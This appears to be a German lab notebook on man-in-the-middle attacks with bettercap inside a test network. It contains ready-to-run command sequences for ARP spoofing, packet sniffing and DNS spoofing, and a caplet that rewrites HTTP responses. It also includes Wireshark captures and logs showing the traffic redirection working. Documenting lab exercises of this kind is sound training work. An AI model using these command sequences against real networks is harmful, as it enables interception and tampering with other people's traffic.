attacker=192.168.226.137
victim=192.168.226.138

host=192.168.226.2


sudo apt update
sudo apt install bettercap 




$ sudo apt install bettercap
 liefert Fehlermeldung.
 
sudo apt install bettercap --fix-missing -y
 
das funktioniert
 
sudo bettercap

```
help
help net.probe
net.probe on
net.show
 
help net.recon
net.recon on
net.show

active
 
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.7.53
arp.spoof on

set net.sniff.filter host 192.168.7.53
net.sniff on
```

```js
// Caplet: title_replace.cap
// Ersetzt den Titel jeder HTML-Seite (im Klartext über HTTP)

// Der neue Titel, der verwendet werden soll
var NEW_TITLE = "🚨 ManipulierT 🚨";

// Wird ausgeführt, wenn der HTTP-Proxy eine Antwort vom Server erhält
http.on('response', function(req, res) {
    // 1. Überprüfen, ob es eine Text-HTML-Antwort ist
    if (res.ContentType.indexOf('text/html') !== -1) {
        
        var body = res.Body.toString();
        
        // 2. Regulärer Ausdruck, um den alten Titel-Tag zu finden
        // Achtung: Der Ausdruck ist so gewählt, dass er nur den Inhalt des Tags ersetzt.
        // Der reguläre Ausdruck sucht nach <title>...</title>
        var titleRegex = /(<title>)(.*?)(<\/title>)/i;

        // 3. Den Titel ersetzen
        // $1 = alles vor dem alten Titel (<title>)
        // $3 = alles nach dem alten Titel (</title>)
        var newBody = body.replace(titleRegex, '$1' + NEW_TITLE + '$3');

        // 4. Den modifizierten Body zurück in die Antwort schreiben
        if (newBody !== body) {
            res.Body = newBody;
            res.ContentLength = newBody.length;
            // Optional: Logge die Modifikation für deine Konsole
            log('Titel ersetzt für Host: ' + req.Host);
        }
    }
});
```

```
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.40.135
set http.proxy.caplet title_replace.js
arp.spoof on
http.proxy on
net.sniff on
```

```
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.40.135
arp.spoof on
net.sniff on
```




# Wireshark



capture filters: `` 

```
nat
host 192.168.40.135
src host 192.168.40.135
```

net.show:

```
┌────────────────┬───────────────────┬─────────┬──────────────┬────────┬────────┬──────────┐
│      IP ▴      │        MAC        │  Name   │    Vendor    │  Sent  │ Recvd  │   Seen   │
├────────────────┼───────────────────┼─────────┼──────────────┼────────┼────────┼──────────┤
│ 192.168.40.128 │ 00:0c:29:3b:8d:3e │ eth0    │ VMware, Inc. │ 0 B    │ 0 B    │ 04:44:16 │
│ 192.168.40.2   │ 00:50:56:ef:e8:4e │ gateway │ VMware, Inc. │ 1.0 kB │ 1.0 kB │ 04:44:16 │
│                │                   │         │              │        │        │          │
│ 192.168.40.1   │ 00:50:56:c0:00:08 │         │ VMware, Inc. │ 0 B    │ 460 B  │ 04:44:28 │
│ 192.168.40.135 │ 00:0c:29:00:61:1d │         │ VMware, Inc. │ 4.9 kB │ 4.8 kB │ 04:44:58 │
│ 192.168.40.254 │ 00:50:56:fa:2b:d8 │         │ VMware, Inc. │ 0 B    │ 368 B  │ 04:44:30 │
└────────────────┴───────────────────┴─────────┴──────────────┴────────┴────────┴──────────┘

```

Wireshark Aufzeichnungen

HTTP GET Request

```
Ethernet II, Src: VMware_00:61:1d (00:0c:29:00:61:1d), Dst: VMware_ef:e8:4e (00:50:56:ef:e8:4e)
Internet Protocol Version 4, Src: 192.168.40.135, Dst: 44.228.249.3
Transmission Control Protocol, Src Port: 56646, Dst Port: 80, Seq: 730, Ack: 2848, Len: 371
Hypertext Transfer Protocol
```
Ethernet Dst ist das Gateway, so wie es sein soll.

---

Aufzeichung nach aktiviertem ARP Spoofing:

```
Frame 9: 74 bytes on wire (592 bits), 74 bytes captured (592 bits) on interface eth0, id 0
Ethernet II, Src: VMware_00:61:1d (00:0c:29:00:61:1d), Dst: VMware_3b:8d:3e (00:0c:29:3b:8d:3e)
Internet Protocol Version 4, Src: 192.168.40.135, Dst: 44.228.249.3
Transmission Control Protocol, Src Port: 43524, Dst Port: 80, Seq: 0, Len: 0
```

Das Ziel ist jetzt die MAC Adresse des Attackers, nicht mehr der Router.

Der darauffolgende Frame ist die Weiterleitung des Attackers an den Router (Wireshark zeigt dies als Retransmission an):

```
Frame 10: 74 bytes on wire (592 bits), 74 bytes captured (592 bits) on interface eth0, id 0
Ethernet II, Src: VMware_3b:8d:3e (00:0c:29:3b:8d:3e), Dst: VMware_ef:e8:4e (00:50:56:ef:e8:4e)
Internet Protocol Version 4, Src: 192.168.40.135, Dst: 44.228.249.3
Transmission Control Protocol, Src Port: 43524, Dst Port: 80, Seq: 0, Len: 0
```

MAC (Attacker) --> MAC (Router)

# Versuche im Labornetz

## Bridged Variante 1

2 Kali Systeme auf dem gleichen Rechner


```
net.probe on
net.show
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.100.235
arp.spoof on
net.sniff on
```

```
┌─────────────────┬───────────────────┬─────────────────┬───────────────────────────────┬────────┬────────┬──────────┐
│      IP ▴       │        MAC        │      Name       │            Vendor             │  Sent  │ Recvd  │   Seen   │
├─────────────────┼───────────────────┼─────────────────┼───────────────────────────────┼────────┼────────┼──────────┤
│ 192.168.100.236 │ 00:0c:29:3b:8d:3e │ eth0            │ VMware, Inc.                  │ 0 B    │ 0 B    │ 05:48:17 │
│ 192.168.100.254 │ 1c:df:0f:ca:41:01 │ gateway         │ Cisco Systems, Inc            │ 10 kB  │ 0 B    │ 05:48:17 │
│                 │                   │                 │                               │        │        │          │
│ 192.168.100.2   │ 00:0c:29:06:d2:5d │                 │ VMware, Inc.                  │ 1.2 kB │ 1.1 kB │ 05:48:52 │
│ 192.168.100.3   │ 00:0c:29:3e:40:9d │ VHOST-W2K22-ADM │ VMware, Inc.                  │ 796 B  │ 1.3 kB │ 05:48:52 │
│ 192.168.100.5   │ 00:0c:29:92:75:a4 │                 │ VMware, Inc.                  │ 480 B  │ 368 B  │ 05:48:52 │
│ 192.168.100.10  │ 00:0c:29:6f:66:49 │ VBACKUP01       │ VMware, Inc.                  │ 796 B  │ 12 kB  │ 05:48:52 │
│ 192.168.100.11  │ 10:60:4b:af:4a:bc │                 │ Hewlett Packard               │ 0 B    │ 368 B  │ 05:48:30 │
│ 192.168.100.21  │ 00:0c:29:fa:b2:f2 │ W2K22-1         │ VMware, Inc.                  │ 3.7 kB │ 4.1 kB │ 05:48:52 │
│ 192.168.100.22  │ 00:0c:29:b1:31:50 │ W2K22-2         │ VMware, Inc.                  │ 868 B  │ 1.4 kB │ 05:48:52 │
│ 192.168.100.50  │ 9c:8e:99:4c:cb:88 │                 │ Hewlett Packard               │ 480 B  │ 368 B  │ 05:48:52 │
│ 192.168.100.51  │ bc:24:11:31:0a:70 │                 │ Proxmox Server Solutions GmbH │ 480 B  │ 368 B  │ 05:48:52 │
│ 192.168.100.71  │ 94:18:82:66:21:d8 │                 │ Hewlett Packard Enterprise    │ 480 B  │ 368 B  │ 05:48:53 │
│ 192.168.100.75  │ bc:24:11:a5:c3:65 │                 │ Proxmox Server Solutions GmbH │ 480 B  │ 473 B  │ 05:48:53 │
│ 192.168.100.76  │ bc:24:11:6c:8c:c4 │                 │ Proxmox Server Solutions GmbH │ 480 B  │ 368 B  │ 05:48:53 │
│ 192.168.100.99  │ bc:24:11:c6:5f:6c │                 │ Proxmox Server Solutions GmbH │ 480 B  │ 368 B  │ 05:48:53 │
│ 192.168.100.231 │ 60:a4:b7:75:70:0d │                 │ TP-Link Corporation Limited   │ 184 B  │ 583 B  │ 05:48:32 │
│ 192.168.100.234 │ bc:24:11:90:bb:fc │                 │ Proxmox Server Solutions GmbH │ 90 B   │ 368 B  │ 05:48:32 │
│ 192.168.100.235 │ 00:0c:29:00:61:1d │                 │ VMware, Inc.                  │ 897 B  │ 716 B  │ 05:48:54 │
│ 192.168.100.248 │ 00:21:1c:15:16:c1 │                 │ Cisco Systems, Inc            │ 210 B  │ 368 B  │ 05:48:54 │
│ 192.168.100.249 │ b8:d4:e7:ff:9b:40 │                 │ Hewlett Packard Enterprise    │ 280 B  │ 368 B  │ 05:48:54 │
│ 192.168.100.250 │ 64:e8:81:78:5a:20 │                 │ Hewlett Packard Enterprise    │ 280 B  │ 368 B  │ 05:48:54 │
│ 192.168.100.251 │ 64:e8:81:78:88:80 │                 │ Hewlett Packard Enterprise    │ 280 B  │ 368 B  │ 05:48:54 │
│ 192.168.100.252 │ 64:e8:81:78:48:00 │                 │ Hewlett Packard Enterprise    │ 280 B  │ 368 B  │ 05:48:54 │
│ 192.168.100.253 │ 00:1d:e6:e3:a9:41 │                 │ Cisco Systems, Inc            │ 210 B  │ 368 B  │ 05:48:54 │
└─────────────────┴───────────────────┴─────────────────┴───────────────────────────────┴────────┴────────┴──────────┘
```

Auch in diesem Fall sieht der Attacker alle Pakete auch wenn ARP Spoofing nicht aktiv ist. Wahrscheinlich ist die VmWare Bridge einfach ein Hub.

## Bridged Variante 2

2 Kali Systeme auf unterschiedlichen Rechnern. Umstecken eines PCs in ein anderes Labornetz.

Ohne ARP Spoofing sieht man den Traffic des Victim Rechners nicht.

Mit Spoofing schon.


# DNS Spoofing

Konfigurationsfile:

```
$ cat bettercap.dns                
# Domain | IP-Adresse für Umleitung
vulnweb.com 192.168.7.54
```

```
net.probe on
  
set arp.spoof.fullduplex true
set arp.spoof.targets 192.168.7.53
arp.spoof on

set dns.spoof.domains vulnweb.com
set dns.spoof.address 192.168.7.54
dns.spoof on
```


set dns.spoof.hosts bettercap.dns


```
192.168.7.0/24 > 192.168.7.54  » [08:39:04] [sys.log] [inf] gateway monitor started ...
192.168.7.0/24 > 192.168.7.54  » net.probe on
192.168.7.0/24 > 192.168.7.54  »   
192.168.7.0/24 > 192.168.7.54  » set arp.spoof.fullduplex true
192.168.7.0/24 > 192.168.7.54  » [08:39:05] [sys.log] [inf] net.probe starting net.recon as a requirement for net.probe
[08:39:05] [sys.log] [inf] net.probe probing 256 addresses on 192.168.7.0/24
192.168.7.0/24 > 192.168.7.54  » set arp.spoof.targets 192.168.7.53
192.168.7.0/24 > 192.168.7.54  » arp.spoof on
192.168.7.0/24 > 192.168.7.54  » [08:39:05] [sys.log] [war] arp.spoof full duplex spoofing enabled, if the router has ARP spoofing mechanisms, the attack will fail.
192.168.7.0/24 > 192.168.7.54  » 
192.168.7.0/24 > 192.168.7.54  » set dns.spoof.domains vulnweb.com
192.168.7.0/24 > 192.168.7.54  » [08:39:05] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.
192.168.7.0/24 > 192.168.7.54  » set dns.spoof.address 192.168.7.54
[08:39:05] [endpoint.new] endpoint 192.168.7.53 detected as 00:0c:29:1f:53:19 (VMware, Inc.).
192.168.7.0/24 > 192.168.7.54  » dns.spoof o[08:39:05] [endpoint.new] endpoint 192.168.7.55 detected as 60:a4:b7:75:7a:7f (TP-Link Corporation Limited).
192.168.7.0/24 > 192.168.7.54  » dns.spoof o[08:39:05] [endpoint.new] endpoint 192.168.7.50 detected as c0:06:c3:38:16:1b (TP-Link Corporation Limited).
192.168.7.0/24 > 192.168.7.54  » dns.spoof on
[08:39:27] [sys.log] [inf] dns.spoof vulnweb.com -> 192.168.7.54
192.168.7.0/24 > 192.168.7.54  » [08:39:45] [sys.log] [inf] dns.spoof sending spoofed DNS reply for vulnweb.com (->192.168.7.54) to 192.168.7.254 : 1c:df:0f:ca:41:01 (Cisco Systems, Inc).
192.168.7.0/24 > 192.168.7.54  » [08:39:45] [sys.log] [inf] dns.spoof sending spoofed DNS reply for vulnweb.com (->192.168.7.54) to 192.168.7.53 : 00:0c:29:1f:53:19 (VMware, Inc.).
192.168.7.0/24 > 192.168.7.54  » [08:39:45] [sys.log] [inf] dns.spoof sending spoofed DNS reply for vulnweb.com (->192.168.7.54) to 192.168.7.53 : 00:0c:29:1f:53:19 (VMware, Inc.).
192.168.7.0/24 > 192.168.7.54  » [08:39:46] [sys.log] [inf] dns.spoof sending spoofed DNS reply for testhtml5.vulnweb.com (->192.168.7.54) to 192.168.7.53 : 00:0c:29:1f:53:19 (VMware, Inc.).
192.168.7.0/24 > 192.168.7.54  » [08:39:46] [sys.log] [inf] dns.spoof sending spoofed DNS reply for testhtml5.vulnweb.com (->192.168.7.54) to 192.168.7.53 : 00:0c:29:1f:53:19 (VMware, Inc.).
192.168.7.0/24 > 192.168.7.54  » [08:39:46] [sys.log] [inf] dns.spoof sending spoofed DNS reply for testhtml5.vulnweb.com (->192.168.7.54) to 192.168.7.254 : 1c:df:0f:ca:41:01 (Cisco Systems, Inc).
```
